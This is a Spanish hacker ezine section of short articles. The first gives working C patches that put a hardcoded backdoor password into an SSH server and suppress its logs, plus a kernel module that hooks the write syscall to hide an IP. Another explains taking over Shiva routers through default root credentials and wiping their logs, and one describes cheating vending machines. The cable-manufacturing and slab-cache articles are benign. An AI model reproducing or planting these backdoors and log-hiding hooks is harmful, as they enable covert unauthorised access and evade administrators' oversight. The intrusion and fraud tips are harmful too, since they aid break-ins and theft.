---
title: "7a69#12-art10"
ezine: "7a69"
---

# 7a69#12-art10

**Ezine:** 7a69

<div className="ascii-content">

```
         -=( 7A69#12 )=--=( art10 )=--=( Cortos )=--=( Varios )=-
     
Y en esta seccion, como siempre, encontrareis mini-articulillos, que, 
creemos, tambien pueden ser de intres :)

  1.- Troyanizando sshd                  - fkt
  2.- Fabricacion de cables de cobre     - N4XoR
  3.- Cocacola Gratis!!                  - bzero
  4.- Slab cache en linux 2.2.x          - Doing
  5.- Router de shiva                    - fkt
  6.- Antidisclosure (anti.security.is)  - Ripe 
  7.- Introduccion al overclocking       - IReick
  8.- El manifiesto del lamer		 - ^Se7eN^

-------------------------------------------------------------------------------
---/ 1 /--/ Troyanizando sshd /--/ fkt /---------------------------------------
-------------------------------------------------------------------------------

                    +-----------------------------+
                    |      Troyanizando SSH       |
                    |           By fkt            |
                    +-----------------------------+

Bien empecemos, en este documento relatarΘ como dejar puertas traseras
(aka backdoors) en el demonio del SSH que ahora es bastante popular y reem-
plaza al telnet en la mayorφa de servidores. Lo explicarΘ para la version
2.3.0, Para seguir este documento has de tener algunos conocimientos de C.
Una vez explicado esto procedamos al meollo de la cuesti≤n...
Para empezar necesitamos un fichero donde definiremos la password del backdoor
para que asi otros no puedan usarlo, le llamaremos por ejemplo, back.h y con-
tendrß lo siguiente:
#define CLAVEBACK "hax0r"
int back;
Lo del int back es para definir una variable entera que usaremos para que si
metemos la password correcta del backdoor no dejemos logs, esta variable po-
drφamos definirla en todos los archivos q modifiquemos en vez de ponerla en el
back.h, pero como es mßs c≤modo definirla aqui pues me he decantado por esta
opci≤n.
Bueno una vez tenemos ese fichero cogemos y descomprimimos el source del ssh
(si no lo teneis www.ssh.net y os lo bajais), una vez descomprimido buscamos
los ficheros donde se produce la autentificaci≤n del usuario para asφ modifi-
carlos y que si el usuario mete la password del backdoor pues que no la
"checkee", buscando vemos el auths-passwd.c lo abrimos y vemos que pone...
Password authentication, server-side.  This calls functions in
machine-specific files to perform the actual authentication.
Vaya! parece que hemos acertado en este archivo se hace la autentificaci≤n del
usuario. Bueno pues ahora cogemos y ponemos...
#include "back.h"
Para que incluya nuestro archivo donde tenemos nuestra password y nuestra va-
riable; ahora vamos leyendo el c≤digo y nos encontramos que...
    if (ssh_user_validate_local_password(uc, password))
      {  
        ssh_log_event(config->log_facility,
        SSH_LOG_NOTICE,
        "User %s's local password accepted.",
        ssh_user_name(uc));
        SSH_DEBUG(5, ("ssh_server_auth_passwd: accepted by local passwd"));
  
        goto password_ok;
      }

        ssh_xfree(password);
        goto password_bad;
Creo que lo hemos encontrado, en ese if comprueba si es un user vßlido y si lo
es lo loguea y va a password_ok y sino lo es pues libera password y va a
password_bad, asφ que habrß que cambiar esto y dejarlo tal que asφ:
    if ((ssh_user_validate_local_password(uc, password)) || (!strcmp(password,CLAVEBACK)))
      {
        if (strcmp(password,CLAVEBACK)) {
          ssh_log_event(config->log_facility,
          SSH_LOG_NOTICE,
          "User %s's local password accepted.",
          ssh_user_name(uc));
          SSH_DEBUG(5, ("ssh_server_auth_passwd: accepted by local passwd"));
          back=0;
        } else {
          back=1;
        }
        goto password_ok;
        }
        ssh_xfree(password);
        goto password_bad;
Bueno voy a explicar esto por si alguien no lo entiende, lo que hacemos es po-
nerle otra condici≤n mßs al if, si el user es vßlido o coincide el password
con CLAVEBACK entonces entramos en el if, y dentro de ese if hay otro que lo
que hace es que si coincide el password con CLAVEBACK pone back a 1 y no lo-
guea y sino loguea y pone back a 0 que quiere decir que no lo estamos usando.
Este archivo ya lo hemos modificado para nuestros intereses, asi que vamos a
seguir buscando ... y mientras miramos el source del sshcommon.c vemos que
sale esto:
  /* Log the disconnect in the system log. */
     ssh_log_event(common->config->log_facility, SSH_LOG_INFORMATIONAL,
     "%s disconnected: %s",
     locally_generated ? "Local" : "Remote host",msg);
Vaya!, esto loguea la desconexi≤n, luego habrß que modificarlo para que no
dejemos logs y quedarφa de la siguiente manera:
  /* Log the disconnect in the system log. */
    if (!back) {
            ssh_log_event(common->config->log_facility, SSH_LOG_INFORMATIONAL,
            "%s disconnected: %s",
            locally_generated ? "Local" : "Remote host",msg);
    }
Ponemos un if diciendo que si no hemos usado la password del backdoor loguee
y si la hemos usado se lo salte mediante la variable back que ya tiene valor
porque se lo dimos previamente en el auths-passwd.c. Obviamente en este ar-
chivo habrß que incluir el back.h como hicimos en el auths-passwd.c
Bueno seguimos mirando y encontramos que mirando el c≤digo del sshd2.c vemos:
case SSH_DISCONNECT_CONNECTION_LOST:
      ssh_log_event(c->server->config->log_facility,
       SSH_LOG_INFORMATIONAL,
      "connection lost: '%s'", msg);
  break;
Parece que esto loguea cuando nos desconectamos asi que vamos a evitarlo...
case SSH_DISCONNECT_CONNECTION_LOST:
  if (!back) {
      ssh_log_event(c->server->config->log_facility,
       SSH_LOG_INFORMATIONAL,
      "connection lost: '%s'", msg);
  }
  break;
Seguimos mirando en el sshd2.c y nos encontramos con:
if (successful)
  ssh_log_event(common->config->log_facility,
  SSH_LOG_NOTICE,
  "User %s, coming from %s, authenticated.",
  user, common->remote_host);
Hemos encontrado un if que loguea si hemos pasado el paso de autentificación
asi que vamos a modificarlo para que no lo haga si usamos nuestro backdoor:
if (!back) {
  if (successful)
    ssh_log_event(common->config->log_facility,
    SSH_LOG_NOTICE,
    "User %s, coming from %s, authenticated.",
    user, common->remote_host);
}
Asφ no loguearφa si usamos el backdoor. Bueno pues ya tenemos el backdoor
hecho, aunque a·n dejarφa un log como este:
Apr 10 19:11:47 Linux1 sshd2[10968]: connection from "127.0.0.1"
Y tambiΘn en el last dejarφa logs.
Eso se puede solucionar modificando el authc-passwd.c y el wtmp.c y hacer que
cuando sea vuestra ip pues que no loguee pero no os voy a dar todo hecho asi
que lo pensais; o tambiΘn otra manera de que no salga es usando un Linux Ker-
nel Module que modifica la syscall write, para esto me remito al articulo de
Doing sobre LKM┤s en el e-zine Netsearch #5 donde viene el siguiente modulo:
/* Oculta La IP 127.0.0.2 */
/* Compilar con gcc -O2 -c log.c */
/* insmod log.o */
#define __KERNEL__
#define MODULE

#include &lt;linux/ctype.h>
#include &lt;linux/config.h>
#include &lt;linux/module.h>
#include &lt;linux/version.h>

#include &lt;linux/fd.h>
#include &lt;linux/fs.h>
#include &lt;linux/fcntl.h>
#include &lt;linux/mm.h>

#include &lt;linux/dirent.h>
#include &lt;linux/file.h>
#include &lt;linux/unistd.h>
#include &lt;linux/if.h>
#include &lt;syscall.h>

#include &lt;asm/segment.h>

extern void *sys_call_table[]; /* array de syscalls */

ssize_t (*o_write) (int, void*, size_t);

int
OCULTAR_STRING(char *name)
{
  if (strstr(name, "127.0.0.2")) return 1;
  return 0;
} 

/*
 * Llamada al sistema write() troyanizada
 */
ssize_t new_write (int fd, void *buf, size_t size)
{
  size_t ret;
  char *tmp;

  if (size < 1) return size;

  if (size > 10000) return (*o_write) (fd, buf, size);

  tmp = (char*) kmalloc(size+1, GFP_KERNEL);
  memset(tmp, 0, size + 1);
  __generic_copy_from_user(tmp, buf, size);

  if (OCULTAR_STRING(tmp)) {
    kfree(tmp);
    return size;
  }
  kfree(tmp);

  return (*o_write) (fd, buf, size);
}

int
init_module()
{
  EXPORT_NO_SYMBOLS;
  o_write = sys_call_table[__NR_write];
  sys_call_table[__NR_write] = new_write;
  return 0;
}

void
cleanup_module()
{
  sys_call_table[__NR_write] = o_write;
}
Este m≤dulo lo que hace es que cuando se va a usar la syscall write() chequea
si aparece por algun lado la ip 127.0.0.2 y si lo hace pues no saca esa linea
por pantalla. Ahora si que ya estß todo a punto, si quereis saber lo que hace
el modulo exactamente leer el e-zine al que me he remitido anteriormente que
viene explicado. Todo lo que he explicado estß testeado 100% en la versi≤n
SSH 2.3.0, pero en la 2.4.0 es prßcticamente igual por no decir igual y en las
anteriores tambiΘn.
Un Saludo

-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
---/ 2 /--/ Fabricacion de cables de cobre /--/ Anonimo /----------------------
-------------------------------------------------------------------------------

Introducci≤n a los cables telef≤nicos.

En este panfleto, por que esto es un panfleto, veremos como se fabrica y se 
usa un cable telef≤nico de los usados normalmente por timofonica. Nos 
centraremos en los cables de cobre  y en pr≤ximos ezines veremos cables de 
fibra y coaxiales.

Por supuesto deciros que uno no esta en posesi≤n de la verdad absoluta, y como 
asno que patea este jodido mundo muchas veces mete la gamba hasta el hφgado, 
asφ que si alguien lee esto y detecta errores o fallos, que no se alarme, es 
normal. (De zoquetes ta el mundo lleno. xD).

Bien empecemos que si no me enrollo.

Comenzaremos por ver la composici≤n y fabricaci≤n de un cable de pares de 
cobre.

La fabricaci≤n se compone de 4 fases bßsicas:

- Aislado.
- Pareado.
- Cableado.
- Forrado de cubierta final.

Aislado.

En este proceso lo que hacemos es trefilar y aislar los hilos conductores que 
forman el cable.

Trefilar es conseguir que los conductores tengan un dißmetro determinado por 
medio de un proceso de estiramiento, haciendo pasar un alambre de cobre de un 
dißmetro alto por una serie de poleas y ba±os de recocido y unos calibres de 
diamante hasta conseguir el dißmetro deseado.
Bßsicamente se trabaja con los siguientes dißmetros:

- 0,405 mm
- 0,5 mm
- 0,64 mm
- 0,9 mm

Aunque tambiΘn se fabrican cables de menor dißmetro, 0.32, y de mayor 1,3 mm

Aunque al cobre se le hace un trefilado previo para poder trabajar con ello en 
las extruder (maquinas de aislado), el proceso donde se le da el dißmetro 
final al conductor se realiza en una maquina extrusora, que ademßs de trefilar 
el hilo a un dißmetro determinado, aφsla los conductores con determinados 
compuestos que bßsicamente son:

- Polietileno s≤lido.
- Polietileno celular.
- Foam.
- Foam Skin.
- PVC (poli cloruro de vinilo).
A estos compuestos se les a±ade un colorante del tipo Masterbach en un 
porcentaje determinado para dar color al aislamiento.

Bueno pues ya tenemos una bobina de conductor aislada de determinado color.

Pasemos al siguiente proceso


Pareado.

Parear es torsionar dos conductores con un paso determinado. Entiendase por 
paso, la cantidad de torsiones por metro. O sea que si una bobina pareada lleva
un paso 76 (por ejemplo) significara que los conductores se torsionan 76 veces
en una distancia de un metro.

TambiΘn existen cables de cuadretes en los que en vez de torsionarse 2 
conductores son 4. 

Las bobinas de pareado que forman un cable dependiendo del color llevan todas 
paso diferente para evitar un problema que veremos mßs adelante.

Por ejemplo, todas las bobinas Blanco-Azul llevan el mismo paso, pero es 
diferente al de las que son Blanco-Naranja, o Amarillo-Gris.

En cuanto al pareado poco mßs que contar asφ que pasaremos al siguiente proceso.


Cableado.

Aquφ la cosa empieza a complicarse.

Para ver la formaci≤n de un cable veremos primero un c≤digo de colores de
pares utilizado por telef≤nica. El nombre de este c≤digo es Event Count.

El c≤digo se compones de 10 colores bßsicos agrupados en 2 grupos:

Grupo 1:
- Blanco. (Bl)
- Rojo. (Ro)
- Negro. (Ne)
- Amarillo.  (Am)
- Violeta. (Vi)
Grupo2:
- Azul. (Az)
- Naranja. (Na)
- Verde. (Ve)
- Marr≤n. (Ma)
- Gris. (Gr)


Combinando estos dos grupos obtenemos un total de 25 tipos de pares diferentes
Ya que un par no puede contener dos colores del mismo grupo salvo la excepci≤n 
de un par del que luego hablaremos.

╙sea:

Par 1: Bl-Az
2: Bl-Na
3: Bl-Ve
4: Bl-Ma
5: Bl-Gr
6: Ro-Az
7: Ro-Na

Asφ hasta el 25 que es Vi-Gr.

A estos 25 pares los llamaremos subunidad y cada 100 pares los llamaremos grupo.
La excepci≤n de la que antes hablßbamos es el par Bl-Ne, llamado Piloto. Este 
par es utilizado por asistencia tΘcnica para comunicarse con la central donde 
esta conectado ese cable, ≤sea  es un par de uso interno de telef≤nica y salvo 
excepciones no hay abonados conectados a el.
Hay un piloto por grupo, ≤sea uno por cada 100 pares con lo cual el grupo 
tiene realmente 101 pares.
 
Los cables pueden tener desde 1 par, hasta 2424 y 3636 pares (de mas pares no 
los he visto).


CentrΘmonos en la fabricaci≤n de uno grande, un 2424 por ejemplo.

Cargamos una cableadota con 101 pares y los agrupamos de 25 en 25 en cuatro 
subunidades, salvo la ·ltima que por contener el piloto tendrß 26.

Cada subunidad tendrß distribuidos los pares en capas concΘntricas en una 
formaci≤n de 3 en el centro 9 en la 2¬ capa y 13 en la 3¬.

Amarramos esas subunidades con una ligadura de nylon utilizando el mismo c≤digo
de colores, ≤sea los primeros 25 con ligadura Bl-Az los 2║ con Bl-Na asφ hasta 
completas los 101 cuyos ·ltimos 26 estarßn con Bl-Ma.
Los siguientes de 101 estarßn, el primer grupo con Bl-Gr, los segundos serßn 
Ro-Az, asφ hasta Ro-Ve, y asφ sucesivamente hasta completar los 606 pares.
De tal manera que obtendremos 6 grupos dispuestos en 4 subunidades de 25¬, que 
para que se mantengan en su formaci≤n de 101 aplicaremos una ligadura de nylon 
monocolor. Esta ligadura serß en los primeros 606 pares de color blanco, ≤sea 
que los primeros seis grupos tendrßn ligadura blanca, del 607 al 1212 esta 
ligadura serß roja, del 1213 al 1818 serß negra y del 1819 al 2424 amarilla.

De esta manera tendremos todos los pares diferenciados.

Ahora hay que formar el cable final con todos los grupos.

Lo cargamos en una cableadota de n·cleos(grupos) en una distribuci≤n de 4 en la
1¬ capa, 8 en la 2¬ y 12 en la 3¬, aplicßndole 2 cintas de poliΘster de forma 
helicoidal consiguiendo asφ un cable de 65 mm de dißmetro aproximadamente 
totalmente redondo y preparado para aplicarle la cubierta.

Pero ni todos los cables llevan n·cleos (grupos) de 101, ni todos llevan 
poliΘster en la cableadora de n·cleos.

En los cables inferiores a 1212 la formaci≤n de los n·cleos es de 50 pares, 
distribuidos los pares en subunidades de 8 y 9 pares de la siguiente forma.

Una de 8 en el centro de Bl-Az (suponemos que es el n·cleo 1) otra de 8 y otra 
de 9 tambiΘn con Bl-AZ hasta completar los 25 en la 2¬ capa  y otras tres de 
8,8,9  Bl-Na tambiΘn en la segunda capa completando asφ los 50 pares en una 
formaci≤n 1 en el centro 5 en la 2¬ capa. El 2║ n·cleo serß igual excepto por 
las ligaduras que serßn Bl-Ve y Bl-Ma y por que las dos ultimas subunidades 
serßn 9-9 teniendo la ultima el piloto (par Bl-Ne), logrando asφ una subunidad 
de 51.

En la cableadora de n·cleos tendremos 12 n·cleos para un 606 y 18 para un 909.

En los cables menores de 606 volvemos a los n·cleos de 25, saliendo estos 
directamente a la cableadora de n·cleos por lo que tendremos en formaci≤n 3-9, 
12 n·cleos para un 303, y 16 n·cleos para un 404 en una formaci≤n 1-5-10.

Hay mßs formaciones en cables menores, todos estos cambios en la formaci≤n se 
realizan para conseguir un cable lo mas redondo posible.

Los cables pueden salir de la habladora de n·cleos con poliΘster helicoidal o 
con ligadura blanca de nylon para amarrarlos.

Generalmente los cables no rellenos suelen salir con poliΘster, y los cables 
rellenos de grasa (ya veremos lo que es en el apartado de cubiertas), siempre 
salen con ligadura (obvio, si les ponemos poliΘster a ver quien les inyecta 
luego grasa).

Bien, ya tenemos el cable, ahora nos falta la cubierta exterior.


Cubierta.

Durante el proceso de cubierta procederemos a inyectar grasa si el cable es 
relleno. Dicha grasa es un compuesto de vaselina hidr≤fuga que se inyecta al 
cable para evitar que en caso de perforaci≤n de la cubierta el agua corra a 
travΘs del cable, se inyecta a una temperatura de fusi≤n de la grasa que es de 
85 grados aproximadamente y cuando enfrφa se queda una pasta semis≤lida 
rellenando tolos intersticios entre los pares y n·cleos del cable.

Si el cable no va relleno es muy posible que llegue ya a cubiertas con el 
poliΘster puesto, si no es asφ se le aplica uno longitudinal de mßs espesor 
que el helicoidal y si es de grasa tambiΘn se le pone una vez que sale del 
inyector.

Seguidamente se le aplica una cinta de aluminio-poliΘster longitudinal a la 
cual se le aplica calor en los bordes para que selle, consiguiendo asφ un tubo.

Por ultimo se le extruye una capa de polietileno negro de alta densidad, 
pasando por un canal≤n de agua para su enfriamiento y a la salida de ese 
canal≤n se le marca los metros y la leyenda rebobinßndolo en una bobina de 
madera, para su posterior paso a calidad y despuΘs a logφstica, para el 
forrado de la bobina y su embarque para cliente
TambiΘn hay cables de doble cubierta que en vez de ser marcados pasan de nuevo 
a otra extruder que les pones otra cinta de acero corrugado que tambiΘn se 
sella, y una segunda cubierta, esta segunda cubierta es ya marcada con los 
metros y la leyenda

Hay muchos tipos de cables, con sus diferentes aislamientos formaciones y 
cubiertas. Esto que hemos visto es un cable tφpico de telef≤nica, para ser 
exactos un 26 EAP 2424.   


Algunas consideraciones:

Los cables de pares se utilizan bßsicamente para la comunicaci≤n en fonφa, 
teniendo en cuenta que telef≤nica considera como aceptable el rango de 
frecuencias entre 300 y 3.400 Hz, que es cercano al de la voz humana, 
obteniendo de ese rango una relaci≤n calidad-costes aceptable.

Salvo excepciones a grandes empresas, organismos oficiales, o por que el 
abonado asφ lo solicite (gastßndose un past≤n), la compa±φa no llegara nunca 
al abonado con fibra ≤ptica debido a su elevado coste. Asφ que siempre se esta 
limitado por la capacidad del cable de cobre en trasmisi≤n de datos.

En estos cables la tensi≤n con el terminal en reposos es de -48 Volts, la 
tensi≤n.
Con el terminal descolgado o de conversaci≤n es de -24volts, y la tensi≤n de 
llamada es de 72 volts de alterna.

Espero que este documento os sirva para entender la estructura de los cables 
que se utilizan normalmente en telecomunicaciones.

En pr≤ximos documentos veremos lo cables de fibra ≤ptica y los sistemas de 
conmutaci≤n y transmisi≤n entre centrales.

Espero no haber sio mu pesao. xD

-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
---/ 3 /--/ Cocacola Gartis!! /--/ bzero /-------------------------------------
-------------------------------------------------------------------------------

 [Introduccion]

 Existen por ahi unas maquinas en las que puedes sacar refrescos... bien, pues
tienen un fallo que esta en fase de correccion pero que todavia quedan cientos
de maquinas que son vulnerables =).

 [Como distingirlas]

 Para saber las maquinas que son vulnerables fijate en la forma de ranura por
donde se meten las monedas. Si son de las que tienen un espacio justo para
meter la moneda y una palanca para tirar hacia abajo, no te servira. Pero, por
el contrario, sin son de las tipicas maquinas que tienen una ranura en la que
metes la moneda y ya cae si funcionara.

 [Tecnica]

 Lo unico que tienes que hacer es buscar una correa de reloj bastante larga.
No se cuanto exactamente, si tienes un reloj de correa lo haces con ese sino
te compras una que tampoco vale una fortuna. Cojes la correa (tiene que ser
del tamaño de la ranura) y la metes hasta el fondo. Ahora piensas el refresco
que quieres, pulsas el boton y... =P Ha funsionao! :D.

 [Final]

 Y esto es todo... no lo hagais en un lugar donde haya mucho movimiento
urbano. Un saludo como siempre a #freeminds & #hack (libres.irc-hispano.org)

-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
---/ 4 /--/ Slab cache en linux 2.2.x /--/ Doing /-----------------------------
-------------------------------------------------------------------------------

 La Slab cache en el kernel 2.2.17 (posiblemente en todos los 2.2.x)
 -------------------------------------------------------------------

  Nota: Toda esta informacion esta sacada de linux/mm/slab.c

  La slab cache es un modelo usado en el kernel alocar y liberar memoria
dentro del kernel. Todas las rutinas de reserva de memoria internas hacen
uso de slabs caches.

  Una slab cache (cache a secas de aqui en adelante) no es mas que una
estructura (typedef struct kmem_cache_s kmem_cache_t;) que contiene referencias
a una serie de slabs (losas o planchas), asi como varios flags y otros campos.

 Una slab es un "cacho" de memoria, mayor que una pagina de memoria (4096 bytes
en i386), que se usa como memoria dinamica. Esta constituida por una 
estructura de control (typedef struct kmem_slab_s kmem_slab_t;), que se situa
en la zona de memoria mas alta del slab. El resto del slab esta dividido en
zonas de memoria iguales, llamadas objetos. Cada objeto tiene asociado una
estructura (typedef struct kmem_bufctl_s kmem_bufctl_t;), que es la union de
3 punteros (por lo que un sizeof de esta estructura devolvera 4). Se podria 
haber usado solo 1, pero como el valor de ese puntero depende el estado del
objeto al que hace referncia el kmem_bufctl_t se les han puesto nombres
distintos.

 En las caches ON_SLAB un kmem_bufctl_t asociado a un objeto esta justo a
continuacion de Θl (por tanto, dentro del slab), mientras que en las OFF_SLAB
el kmem_bufctl_t se encuentra en otra zona de memoria.

 Aqui os pongo un esquema (algo :P) grafico para dejar las cosas mas claras:

 Una cache:

 [                             kmem_cache_t                                 ]
 [   c_firstp                                                c_lastp        ]
        |                                                       |
        |                                                       |
        |                                                       |
        V                                                       |
 [   kmem_slab_t   ]                                            |
 [         s_nextp ]                                            |
    ^          |                                                V
    |          \--------------------------------> [      kmem_slab_t     ]
    \                                             [   s_prevp            ]
     \--------------------------------------------------|

  El puntero c_firstp apunta al primer slab de la cache, y c_lastp al ultimo
slab. En los slabs, el puntero s_nextp apunta al siguiente slab de la cache,
y s_prevp al anterior (si, como en una lista doblemente enlazada).

 Una slab (IN_SLAB):

 [                           kmem_slab_t                                    ]
 [    s_mem                   s_freep                                       ]
        |                       |
        |                       |
        |                       |
        V                       V
       [ OBJETO #1 ][ kmem_bufctl_t ] [ OBJETO #2 ][ kmem_bufctl_t ]
      
 El puntero s_mem apunta al inicio de la slab, y por tanto, al inicio del
primer objeto de la slab. s_freep apunta al kmem_bufctl_t del primero objeto
libre (que no se ha reservado, recordemos que esto es para obtener memoria
de forma dinamica). 

 El resto de los campos de la kmem_cache_t y kmem_slab_t son bastante
auto-explicativos; os pego las definiciones aqui:

 (Nota: he quitado algunos campos de debug)
 (Nota2: Los comentatios en espa±ol son mios :-> )

struct kmem_cache_s {
        kmem_slab_t              *c_freep;      /* first slab with free objs */
        unsigned long             c_flags;      /* constant flags */
        unsigned long             c_offset;     /* Longitud de los datos de cada objeto almacenado */
        unsigned long             c_num;        /* # of objs per slab */

        unsigned long             c_magic;
        unsigned long             c_inuse;      /* kept at zero */
        kmem_slab_t              *c_firstp;     /* first slab in chain */
        kmem_slab_t              *c_lastp;      /* last slab in chain */

        spinlock_t                c_spinlock;
        unsigned long             c_growing;    /* esto se pone a 1 cuando
                                            se estan reservando nuevas slabs
                                            en la cache *:
        unsigned long             c_dflags;     /* dynamic flags */
        size_t                    c_org_size;
        unsigned long             c_gfporder;   /* order of pgs per slab (2^n) */
        void (*c_ctor)(void *, kmem_cache_t *, unsigned long); /* constructor func */
        void (*c_dtor)(void *, kmem_cache_t *, unsigned long); /* de-constructor func */
        unsigned long             c_align;      /* alignment of objs */
        size_t                    c_colour;     /* cache colouring range */
        size_t                    c_colour_next;/* cache colouring */
        unsigned long             c_failures;
        const char               *c_name;
        struct kmem_cache_s      *c_nextp;
        kmem_cache_t             *c_index_cachep;
};

typedef struct kmem_slab_s {
        struct kmem_bufctl_s    *s_freep;  /* ptr to first inactive (libre/free) obj in slab */
        struct kmem_bufctl_s    *s_index;  /* este campo se usa solo en caches OFF_SLAB */
        unsigned long            s_magic;
        unsigned long            s_inuse;  /* num of objs active (ocupados) in slab */

        struct kmem_slab_s      *s_nextp;
        struct kmem_slab_s      *s_prevp;
        void                    *s_mem;    /* addr of first obj in slab */
        unsigned long            s_offset:SLAB_OFFSET_BITS,
                                 s_dma:1;
} kmem_slab_t;

 Las caches pueden ser creadas y liberadas (que novedad!), pero al ser
liberadas, su estrcutura de control no se libera, porque causaria muchos
problemas (es lo que pone un developer del kernel; a mi me huele a chapuza XD)

 Las caches tambien se reservan dinamicamente, por lo tanto, necesitan de una
cache ya existente de la que cojer memoria, esta cache es llamada: 
cache_cache (que original). Esta esta definida de forma estatica, y todas las
kmem_cache_t que se creen de forma dinamica son objetos en alguna slab de
esta cache "primaria".

 Cuando el kernel se inicia, se reservan 13 caches mas, llamadas:

/* Names for the general caches.  Not placed into the sizes struct for
 * a good reason; the string ptr is not needed while searching in kmalloc(),
 * and would 'get-in-the-way' in the h/w cache.
 */
static char *cache_sizes_name[] = {
#if     PAGE_SIZE == 4096
        "size-32",
#endif
        "size-64",
        "size-128",
        "size-256",
        "size-512",
        "size-1024",
        "size-2048",
        "size-4096",
        "size-8192",
        "size-16384",
        "size-32768",
        "size-65536",
        "size-131072"
};

 Creo que esta claro en que se diferencian unas de otras :P (por si alguno
aun no se ha coscado recordare que el tama±o de los objetos que reservas con
una cache es __FIJO__, y por lo tanto el kernel crea caches de tama±o
esponencial para que cuando hagas un kmalloc puedes usar la cache del tama±o
inmediatamente superior al que pides, y asi hace un uso mas eficiente de la
memoria).

 Hay una variable global definida asi:

typedef struct page mem_map_t;

mem_map_t *mem_map;

 Este puntero despues de ser apuntado en el boot, se usa como un array de
struct page's, donde cada pagina de la memoria del kernel tiene una entrada
en dicho array.

 Cuando creas una nueva cache (con kmem_cache_create()), no tiene ninguna
slab creada. Cuando alguien reserva memoria en esa cache, se piden paginas
al sistema, y se usan para almacenar la nueva slab que se va a crear en esa
cache. Una vez que tienes las paginas, y la slab creada, se usa la struct page
correspondiente a cada pagina de la slab localizada en mem_map, y se apunta
el campo next de la struct page a la cache de la que cuelga la slab creada,
y el campo prev a la estructura de control de la slab.

 Y para que co±o han hecho esto? Pues para que en kfree() se pueda ver con
facilidad a que cache y slab pertenece un puntero que se quiere liberar.
Es tan sencillo como sacar la pagina a la que pertenece el puntero, irse a
mem_map a ver la struct page correspondiente, y mirar a sus campos prev y
next.

 En el fichero slab.c vienen mas info, a que esperais para leerla :)

-------------------------------------------------------------------------------


-------------------------------------------------------------------------------
---/ 5 /--/ Router de shiva /--/ fkt /-----------------------------------------
-------------------------------------------------------------------------------

                        +----------------------------+
                        +  Shiva LandRover Systems   +
                        + Por fkt &lt;fkt@funfatal.org> +
                        +----------------------------+

En este documento tratarΘ de explicar como aprovecharse de estos routers que
al 80% tienen la cuenta por defecto activada ya que el admin usa su propia
cuenta con privilegios.
El documento constarß de 3 partes:

1.- Introducci≤n
2.- ┐QuΘ pueden hacer los Shiva LandRover?
3.- La Linea de Comandos

Bien empezemos...

1.- Introducci≤n:

Los sistemas Shiva son muy comunes encontrarlos cuando escaneas, casi seguro
que en tus logs de alg·n scan tengas unos pocos y quizßs no les hayas presta-
do demasiada atenci≤n. Bien, lo primero es saber detectar que se trata de un
Shiva LandRover, para ello nos fijaremos en el prompt que te sale al entrar
que normalmente es algo parecido a @Userid: . Pues bien el fallo potencial
de seguridad de estos sistemas es que la cuenta por defecto la tienen activa-
da en su gran mayorφa, Θsta cuenta es login: root y password: &lt;enter>
Alguna vez cuando conectamos a un Shiva puede salir...
"Starting Radius Authentification...."
No presteis demasiada atenci≤n a Θsto por ahora ya que es solo un intento de
hacer que el sistema tenga un control seguro, pero en la mayorφa de los casos
estß mal configurado.
Estos sistemas tan interesantes cuentan con un loggeador asφ que olvidaros de
entrar por fuerza bruta. Aunque si entramos dentro con un simple "clear log"
se borran todas las entradas.

2.- ┐QuΘ pueden hacer los Shiva LandRover?

Bien, los Shiva tienen unos servicios bastante interesantes a nuestra dispo-
sici≤n, como son:

* PPP (Point-to-Point Protocol): Este es el protocolo que tanto nos gusta,
los Shiva normalmente suelen tener un servidor DNS interno asi que si tienes
suerte puede que estΘ conectado a internet. Ya veremos mßs adelante que es lo
que se puede hacer si tiene conexion a internet aparte de conectarnos gratis
claro ;).

* Modem DIALOUT: En la mayorφa de los casos, el sistema estß configurado para
permitir llamadas al exterior, es lo que se llama DIALOUT, esto lo puedes uti
lizar para llamar a BBS, hacer desvios, escanear y todo lo que se te ocurra.
Por ejemplo si configuras una conexi≤n PPP incluso puedes hacer otra llamada
externa a una BBS mientras estßs conectado a internet a traves del Shiva.

Otras utilidades como telnet, ping, traceroute, etc... son las que te ayuda-
rßn a saber si el Shiva estß o no conectado a internet.

3.- La Linea de Comandos:

Cuando estemos dentro nos saldrß algo como esto...

Shiva Version 4.5.3 97/02/07
Shiva#>

Para obtener una lista de los comandos disponibles ponemos "help" o "?":

alert                          Send text alert to all dial-in users
busy-out line &lt;number>         Busy-out serial line modem
clear &lt;keyword>                Reset part of the system
comment                        Enter a comment into the log
configure                      Enter a configuration session
connect &lt;port pool>            Connect to a shared serial port
crashdump                      Write crashblock to log
disable                        Disable privileges
help                           List of available commands
initialize &lt;keyword>           Reinitialize part of the system
lan-to-lan &lt;keyword>           Manage LAN-to-LAN connections
passwd                         Change password
ping &lt;IP host>                 Send ICMP echo to IP host
ppp                            Start a PPP session
quit                           Quit from shell
reboot                         Schedule reboot
show &lt;keyword>                 Information commands, type "show ?" for list
slip                           Start a SLIP session
telnet &lt;IP host>               Start a Telnet session
testline                       Test a line

Lo primero que haremos es ver si estamos solos o por el contrario hay alguien
mßs conectado, para ello hacemos un "show users":

Shiva#> show users &lt;enter>

Line             User                     Activity  Idle/Limit    Up/Limit
   1             jsmith                      PPP       0/   10     0/ None
   2             root                        shell     0/   10     0/ None
Total users: 2

Aquφ vemos que nosotros estamos en la linea 2 y que hay un usuario PPP en la
linea 1, normalmente los usuarios no estßn configurados para conectar remota
mente por PPP, asi que el usuario jsmith lo mßs seguro es que estΘ en una ter
minal de la LAN (esto se podrφa saber mirando los permisos de ese usuario).
Ahora vamos a saber como de grande es el sistema:

Shiva#> show lines &lt;enter>

Async Lines:
Line State   Rate/P/Stop/   RA|DCD|DSR|DTR|RTS|CTS|Fr errs| Overruns|PErrs
   1 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
   2 CHAR   57600/N/   1/     |ON |ON |on |on |ON |      2|        0|   0
   3 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
   4 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
   5 IDLE   57600/N/   1/     |OFF|OFF|on |on |OFF|      0|        0|   0
   6 IDLE  115200/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
   7 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
   8 IDLE  115200/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0

Aquφ vemos la cantidad de lineas del sistema, como vemos hay 8, este es el
tama±o com·n en la mayorφa de los sistemas Shiva. TambiΘn en esta lista pode-
mos ver las caracterφsticas de cada linea asi como su estado.

Ahora vamos a ver cuantas lineas de serie hay para saber el tama±o de la red:

Shiva#> show arp &lt;enter>
